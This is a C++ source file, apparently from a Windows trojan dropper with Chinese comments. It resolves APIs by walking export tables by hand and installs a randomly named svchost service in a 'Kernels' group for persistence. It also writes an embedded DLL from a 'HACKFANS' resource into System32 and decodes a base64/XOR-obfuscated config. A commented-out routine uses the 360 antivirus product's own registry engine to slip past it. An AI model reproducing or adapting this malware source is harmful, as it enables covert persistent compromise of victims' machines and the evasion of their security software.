// MyCommon.cpp: implementation of the MyCommon class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MyCommon.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
char MyCommon::EncodeString[MAX_CONFIG_LEN] = {0};
char MyCommon::ServiceConfig[MAX_CONFIG_LEN] = {0};
char MyCommon::base64[100] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
pGetInterfaceInfo MyCommon::MyGetInterfaceInfo = NULL;
pAddIPAddress MyCommon::MyAddIPAddress = NULL;
pDeleteIPAddress MyCommon::MyDeleteIPAddress = NULL;
DWORD MyCommon::IpContext[1000] = {0};
pRtlInitAnsiString MyCommon::MyRtlInitAnsiString = NULL;
pRtlInitUnicodeString MyCommon::MyRtlInitUnicodeString = NULL;
pRtlAnsiStringToUnicodeString MyCommon::MyRtlAnsiStringToUnicodeString = NULL;
pRtlUnicodeStringToAnsiString MyCommon::MyRtlUnicodeStringToAnsiString = NULL;
pinet_addr MyCommon::Myinet_addr = NULL;

MyCommon::MyCommon()
{

}

MyCommon::~MyCommon()
{

}

DWORD MyCommon::GetProcessID(TCHAR *lpProcessName)
{
	DWORD RetProcessID = 0;
	HANDLE handle = NULL;
	PROCESSENTRY32 *info = (PROCESSENTRY32*)GlobalAlloc( NULL, sizeof(PROCESSENTRY32) );
	info->dwSize = sizeof(PROCESSENTRY32);
	handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if(Process32First(handle,info))
	{
		if ( lstrcmpi(info->szExeFile,lpProcessName) == 0 )
		{
			RetProcessID = info->th32ProcessID;
			GlobalFree(info);
			return RetProcessID;
		}
		while(Process32Next(handle,info) != FALSE)
		{
			if ( lstrcmpi(info->szExeFile,lpProcessName) == 0 )
			{
				RetProcessID = info->th32ProcessID;
				GlobalFree(info);
				return RetProcessID;
			}
		}
	}
	GlobalFree(info);
	return RetProcessID;
}

int Mystrcmp(const char *cs, const char *ct)
{
	signed char __res;
	while (1)
	{
		if ((__res = *cs - *ct++) != 0 || !*cs++) break;
	}
	return __res;
}

DWORD MyCommon::GetProAddress( HMODULE phModule,char* pProcName )
{
	if (!phModule) return 0;
	PIMAGE_DOS_HEADER pimDH = (PIMAGE_DOS_HEADER)phModule;
	PIMAGE_NT_HEADERS pimNH = (PIMAGE_NT_HEADERS)((char*)phModule+pimDH->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pimED = (PIMAGE_EXPORT_DIRECTORY)((DWORD)phModule+pimNH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	DWORD pExportSize = pimNH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
	DWORD pResult = 0;
	if ((DWORD)pProcName < 0x10000)
	{
		if ((DWORD)pProcName >= pimED->NumberOfFunctions+pimED->Base || (DWORD)pProcName < pimED->Base) return 0;
		pResult = (DWORD)phModule+((DWORD*)((DWORD)phModule+pimED->AddressOfFunctions))[(DWORD)pProcName-pimED->Base];
	}
	else
	{
		DWORD* pAddressOfNames = (DWORD*)((DWORD)phModule+pimED->AddressOfNames);
		for (unsigned long i=0;i < pimED->NumberOfNames ; i++)
		{
			char* pExportName = (char*)(pAddressOfNames[i]+(DWORD)phModule);
			if (Mystrcmp(pProcName,pExportName) == 0)
			{
				WORD* pAddressOfNameOrdinals = (WORD*)((DWORD)phModule+pimED->AddressOfNameOrdinals);
				pResult  = (DWORD)phModule+((DWORD*)((DWORD)phModule+pimED->AddressOfFunctions))[pAddressOfNameOrdinals[i]];
				break;
			}
		}
	}
	if (pResult != 0 && pResult >= (DWORD)pimED && pResult < (DWORD)pimED+pExportSize)
	{
		char* pDirectStr = (char*)pResult;
		bool pstrok = false;
		while (*pDirectStr)
		{
			if (*pDirectStr == '.')
			{
				pstrok = true;
				break;
			}
			pDirectStr++;
		}
		if (!pstrok) return 0;
		char pdllname[MAX_PATH];
		int  pnamelen = pDirectStr - (char*)pResult;
		if (pnamelen <= 0) return 0;
		memcpy(pdllname,(char*)pResult,pnamelen);
		pdllname[pnamelen] = 0;
		HMODULE phexmodule = GetModuleHandleA(pdllname);
		pResult = GetProAddress(phexmodule,pDirectStr+1);
	}
	return pResult;
}

BOOL MyCommon::GetAddr()
{
	HMODULE hIphlpapi = LoadLibrary( _T("iphlpapi.dll") );
	HMODULE hNtdll = GetModuleHandle( _T("ntdll.dll") );
	HMODULE hWs2_32 = LoadLibrary( _T("WS2_32.dll") );
	if (!hIphlpapi) return FALSE;
	MyGetInterfaceInfo = (pGetInterfaceInfo)GetProAddress( hIphlpapi, "GetInterfaceInfo" );
	if (!MyGetInterfaceInfo) return FALSE;
	MyAddIPAddress = (pAddIPAddress)GetProAddress( hIphlpapi, "AddIPAddress" );
	if (!MyAddIPAddress) return FALSE;
	MyDeleteIPAddress = (pDeleteIPAddress)GetProAddress( hIphlpapi, "DeleteIPAddress" );
	if (!MyDeleteIPAddress) return FALSE;
	////////////////////////////////////////////////////////////////////////////////////////////
	MyRtlInitAnsiString = (pRtlInitAnsiString)GetProAddress( hNtdll, "RtlInitAnsiString" );
	if (!MyRtlInitAnsiString) return FALSE;
	MyRtlAnsiStringToUnicodeString = (pRtlAnsiStringToUnicodeString)GetProAddress( hNtdll, "RtlAnsiStringToUnicodeString" );
	if (!MyRtlAnsiStringToUnicodeString) return FALSE;
	MyRtlInitUnicodeString = (pRtlInitUnicodeString)GetProAddress( hNtdll, "RtlInitUnicodeString" );
	if (!MyRtlInitUnicodeString) return FALSE;
	MyRtlUnicodeStringToAnsiString = (pRtlUnicodeStringToAnsiString)GetProAddress( hNtdll, "RtlUnicodeStringToAnsiString" );
	if (!MyRtlUnicodeStringToAnsiString) return FALSE;
	////////////////////////////////////////////////////////////////////////////////////////////
	Myinet_addr = (pinet_addr)GetProAddress( hWs2_32, "inet_addr" );
	if (!Myinet_addr) return FALSE;


	return TRUE;
}

BOOL MyCommon::Stop360( char *IPADDR, int i )
{
	DWORD dwRet=0;
	PIP_INTERFACE_INFO plfTable=NULL;
	IP_ADAPTER_INDEX_MAP AdaptMap;
	DWORD dwBufferSize=0;
	TCHAR szFriendName[256]={0};
	DWORD tchSize=sizeof(TCHAR)*256;
	ULONG NTEContext   =   0;
	ULONG NTEInstance=0;
	IPAddr NewIP;
	IPAddr NewMask;
	dwRet = MyGetInterfaceInfo(NULL,&dwBufferSize);   
	if( dwRet == ERROR_INSUFFICIENT_BUFFER )   
	{
		plfTable = (PIP_INTERFACE_INFO)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,dwBufferSize);
		MyGetInterfaceInfo(plfTable,&dwBufferSize);
	}
	NewIP   =   Myinet_addr( IPADDR );
	NewMask   =   Myinet_addr( "255.255.255.0" );
	AdaptMap=plfTable->Adapter[0];//i是第几块网卡
	MyCommon::IpContext[i] = MyAddIPAddress( NewIP, NewMask, AdaptMap.Index, &NTEContext, &NTEInstance );
	HeapFree(GetProcessHeap(),HEAP_ZERO_MEMORY,plfTable);
	return TRUE;
}

BOOL MyCommon::ReleaseResource( WORD wResourceID, LPCTSTR lpType, LPCTSTR lpFileName, PCHAR lpConfigString )
{
	HGLOBAL hRes;
	HRSRC hResInfo;
	HANDLE hFile;
	DWORD dwBytes;

	hResInfo = FindResource( NULL, MAKEINTRESOURCE(wResourceID), lpType);
	if (hResInfo == NULL) return FALSE;
	hRes = LoadResource( NULL, hResInfo);
	if (hRes == NULL) return FALSE;
	hFile = CreateFile
		(
		lpFileName, 
		GENERIC_READ|GENERIC_WRITE,
		NULL,//独占
		NULL,
		CREATE_ALWAYS,//存在时覆盖原有文件
		FILE_ATTRIBUTE_NORMAL,
		NULL
		);

	if (hFile == NULL) return FALSE;

	WriteFile(hFile, hRes, SizeofResource(NULL, hResInfo), &dwBytes, NULL);
	// 写入配置
	if (lpConfigString != NULL)
	{
		WriteFile(hFile, lpConfigString, lstrlenA(lpConfigString) + 1, &dwBytes, NULL);
	}
	CloseHandle(hFile);
	FreeResource(hRes);
//	SetFileAttributes(lpFileName, FILE_ATTRIBUTE_HIDDEN);
	return TRUE;
}

LPCTSTR MyCommon::InstallService(LPCTSTR lpServiceDisplayName, LPCTSTR lpServiceDescription, PCHAR lpConfigString, HWND hWindow )
{
	TCHAR *RetName = NULL;
	TCHAR *pSvchost = _T("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost");
	TCHAR *bin = _T("%SystemRoot%\\System32\\svchost.exe -k Kernels");
	TCHAR *InstallName = new TCHAR[24];
	TCHAR strSubKey[1024] = _T("SYSTEM\\CurrentControlSet\\Services\\");
	__asm nop;
	TCHAR DllPath[MAX_PATH], ReadBuffer[1024];
	HKEY hKey = NULL;
	SC_HANDLE hSCM = NULL,hService = NULL;
	DWORD dwDisposition, type, size = sizeof(ReadBuffer);
	memset( InstallName, 0, 24 * sizeof(TCHAR) );
	wsprintf( InstallName, _T("F%08dK") , GetTickCount() );
	__try
	{
		hSCM = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS );
		if (!hSCM) __leave;
		if ( RegOpenKeyEx( HKEY_LOCAL_MACHINE, pSvchost, 0, KEY_READ|KEY_WRITE, &hKey ) != 0 ) __leave;
		if ( RegQueryValueEx( hKey, _T("Kernels"), 0, &type, (LPBYTE)ReadBuffer, &size ) == 0 )
		{
			hService = OpenService( hSCM, ReadBuffer, SERVICE_ALL_ACCESS );
			if (hService)
			{
				DeleteService(hService);
				CloseServiceHandle(hService);
				hService = NULL;
			}
		}
		if ( RegSetValueEx( hKey, _T("Kernels"), 0, REG_MULTI_SZ, (LPBYTE)InstallName, lstrlen(InstallName) * sizeof(TCHAR) ) != 0 ) __leave;
//		RegCloseKey(hKey);
		hService = CreateService( hSCM,
								InstallName,
								lpServiceDisplayName,
								SERVICE_ALL_ACCESS,
								SERVICE_WIN32_OWN_PROCESS,
								SERVICE_DISABLED,//禁用，后面再启用
								SERVICE_ERROR_NORMAL,
								bin, NULL, NULL, NULL, NULL, NULL );
		if (!hService) __leave;
		lstrcat( strSubKey, InstallName );
		if ( RegCreateKeyEx( HKEY_LOCAL_MACHINE, strSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition ) == 0 )
		{
			RegCloseKey(hKey);
		}
		if ( RegOpenKeyEx( HKEY_LOCAL_MACHINE, strSubKey, 0, KEY_READ|KEY_WRITE, &hKey ) != 0 ) __leave;
		if ( RegSetValueEx( hKey, _T("Description"), 0, REG_SZ, (LPBYTE)lpServiceDescription, lstrlen(lpServiceDescription) * sizeof(TCHAR) ) != 0 ) __leave;
		RegCloseKey(hKey);
		lstrcat( strSubKey, _T("\\Parameters") );
		GetSystemDirectory( DllPath, sizeof(DllPath)/sizeof(TCHAR) );
		lstrcat( DllPath, _T("\\") );
		lstrcat( DllPath, InstallName );
		lstrcat( DllPath, _T(".cmd") );
		if ( RegCreateKeyEx( HKEY_LOCAL_MACHINE, strSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition ) == 0 )
		{
			RegCloseKey(hKey);
		}
//		if ( !MyCommon::Use360Fun( strSubKey, _T("ServiceDll"), DllPath ) )
		{
			ShowWindow( hWindow, SW_SHOWNORMAL );
			if ( RegOpenKeyEx( HKEY_LOCAL_MACHINE, strSubKey, 0, KEY_READ|KEY_WRITE, &hKey ) != 0 ) __leave;
			if ( RegSetValueEx( hKey, _T("ServiceDll"), 0, REG_EXPAND_SZ, (LPBYTE)&DllPath, lstrlen(DllPath) * sizeof(TCHAR) ) != 0 ) __leave;
			ShowWindow( hWindow, SW_HIDE );
		}
		//释放文件，留空暂定
		ReleaseResource( IDR_DLL, _T("HACKFANS"), DllPath, lpConfigString );
		RetName = InstallName;
	}
	__finally
	{
		if (hKey) RegCloseKey(hKey);
		if (hService) CloseServiceHandle(hService);
		if (hSCM) CloseServiceHandle(hSCM);
	}
	return RetName;
}

LPBYTE MyCommon::FindConfigString( WORD wResourceID, LPCTSTR lpType )
{
	LPBYTE Ret = NULL;
	HGLOBAL hRes;
	HRSRC hResInfo;
	DWORD Res_Size = 0;
	hResInfo = FindResource( NULL, MAKEINTRESOURCE(wResourceID), lpType);
	if (hResInfo == NULL) return NULL;
	hRes = LoadResource( NULL, hResInfo);
	if (hRes == NULL) return NULL;
	Res_Size = SizeofResource(NULL, hResInfo);
	Ret = new BYTE[Res_Size+1];
	memset( Ret, 0, Res_Size+1 );
	memcpy( Ret, hRes, Res_Size );
	FreeResource(hRes);
	return Ret;
}

int MyCommon::memfind(const char *mem, const char *str, int sizem, int sizes)
{
	int   da,i,j;
	if (sizes == 0) da = lstrlenA(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
			if (j == da) return i;   
	}
	return -1;   
}

int MyCommon::pos(char c)
{
	char *p;
	for(p = base64; *p; p++)
		if(*p == c)
			return p - base64;
		return -1;
}

int MyCommon::base64_decode(const char *str, char **data)
{
	const char *s, *p;
	unsigned char *q;
	int c;
	int x;
	int done = 0;
	int len;
	s = (const char *)malloc(strlen(str));
	q = (unsigned char *)s;
	for(p=str; *p && !done; p+=4){
		x = pos(p[0]);
		if(x >= 0)
			c = x;
		else{
			done = 3;
			break;
		}
		c*=64;
		
		x = pos(p[1]);
		if(x >= 0)
			c += x;
		else
			return -1;
		c*=64;
		
		if(p[2] == '=')
			done++;
		else{
			x = pos(p[2]);
			if(x >= 0)
				c += x;
			else
				return -1;
		}
		c*=64;
		
		if(p[3] == '=')
			done++;
		else{
			if(done)
				return -1;
			x = pos(p[3]);
			if(x >= 0)
				c += x;
			else
				return -1;
		}
		if(done < 3)
			*q++=(c&0x00ff0000)>>16;
		
		if(done < 2)
			*q++=(c&0x0000ff00)>>8;
		if(done < 1)
			*q++=(c&0x000000ff)>>0;
	}
	
	len = q - (unsigned char*)(s);
	
	*data = (char*)realloc((void *)s, len);
	
	return len;
}

char* MyCommon::MyDecode(char *str)
{
	int		i = 0, len = 0;
	char	*data = NULL;
	len = base64_decode(str, &data);
	
	while( i < len )
	{
		data[i] -= 0x6;
		data[i] ^= 0x12;
		i++;
	}
	return data;
}

void MyCommon::StartService(LPCTSTR lpService)
{
	SC_HANDLE hSCManager = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS );
	if ( NULL != hSCManager )
	{
		SC_HANDLE hService = OpenService(hSCManager, lpService, SERVICE_ALL_ACCESS );
		if ( NULL != hService )
		{
			ChangeServiceConfig( hService, SERVICE_NO_CHANGE, SERVICE_AUTO_START, SERVICE_NO_CHANGE,NULL, NULL, NULL, NULL, NULL, NULL, NULL);
			::StartService(hService, 0, NULL);
			CloseServiceHandle( hService );
		}
		CloseServiceHandle( hSCManager );
	}
}

PWCHAR MyCommon::ANSI2UNICODE( PCHAR Buf )
{
	ANSI_STRING as;
	UNICODE_STRING ns;
	MyRtlInitAnsiString( &as, Buf );
	MyRtlAnsiStringToUnicodeString( &ns, &as, TRUE );
	return ns.Buffer;
}

PCHAR MyCommon::UNICODE2ANSI( PWCHAR Buf )
{
	ANSI_STRING as;
	UNICODE_STRING ns;
	MyRtlInitUnicodeString( &ns, Buf );
	MyRtlUnicodeStringToAnsiString( &as, &ns, TRUE );
	return as.Buffer;
}
/*
BOOL MyCommon::Use360Fun( PTCHAR SubKey, PTCHAR ValueName, PTCHAR Buff )
{
	BOOL Ret = FALSE;
	DWORD Pid_360 = 0;
	HANDLE hPro = NULL;
	TCHAR FullPath[MAX_PATH];
	TCHAR *pos = NULL;
	HMODULE hModule = NULL;
	HKEY hKey = NULL;
	pGetModuleFileNameExW MyGetModuleFileNameEx = NULL;
	__try
	{
		Pid_360 = GetProcessID( _T("360tray.exe") );
		if ( Pid_360 == 0 ) __leave;
		hPro = OpenProcess( PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, FALSE, Pid_360 );
		if (!hPro) __leave;
		MyGetModuleFileNameEx = (pGetModuleFileNameExW)GetProAddress( LoadLibrary( _T("psapi.dll") ), "GetModuleFileNameExW" );
		if ( !MyGetModuleFileNameEx ) __leave;
		MyGetModuleFileNameEx( hPro, 0, FullPath, sizeof(FullPath) );
		if ( lstrlen(FullPath) == 0 ) __leave;
		ToLower(FullPath);
		if ( wcsstr( FullPath, _T("\\safemon\\") ) == NULL ) __leave;
		pos = wcsstr( FullPath, _T("safemon\\360tray.exe") );
		if ( pos == NULL ) __leave;
		*pos = '\0';
		lstrcat( FullPath, _T("deepscan\\bregdll.dll") );
		if ( GetFileAttributes(FullPath) == -1 ) __leave;
		hModule = LoadLibrary(FullPath);
		if (!hModule) __leave;
		INIT_REG_ENGINE InitRegEngine = (INIT_REG_ENGINE)GetProAddress( hModule, "InitRegEngine");
		BREG_OPEN_KEY BRegOpenKey = (BREG_OPEN_KEY)GetProAddress( hModule, "BRegOpenKey");
		BREG_CLOSE_KEY BRegCloseKey = (BREG_CLOSE_KEY)GetProAddress( hModule, "BRegCloseKey");
		REG_SET_VALUE_EX BRegSetValueEx = (REG_SET_VALUE_EX)GetProAddress( hModule, "BRegSetValueEx");
		if ( !InitRegEngine || !BRegOpenKey || !BRegCloseKey || !BRegSetValueEx ) __leave;
		if ( !InitRegEngine() ) __leave;
		if ( BRegOpenKey( HKEY_LOCAL_MACHINE, MyCommon::UNICODE2ANSI(SubKey), &hKey) < 0 ) __leave;
		if ( BRegSetValueEx(hKey, MyCommon::UNICODE2ANSI(ValueName), NULL, REG_EXPAND_SZ, (LPBYTE)MyCommon::UNICODE2ANSI(Buff), lstrlen(Buff) + 1 ) < 0 ) __leave;
		BRegCloseKey(hKey);
		hKey = NULL;
		Ret = TRUE;
	}
	__finally
	{
		FreeLibrary(hModule);
		if (hPro) CloseHandle(hPro);
		return Ret;
	}
	return Ret;
}
*/
PTCHAR MyCommon::ToLower(TCHAR s[])
{
	int i = 0;
	while(s[i] != '\0' )
	{ 
		// 判断是否是小写字母 
		if(s[i] >= 'A' && s[i] <= 'Z' ) 
			s[i] += 32;     // 小写字母比大写字母的 ASCII 大 32 
		i++;
	}
	return s;
}
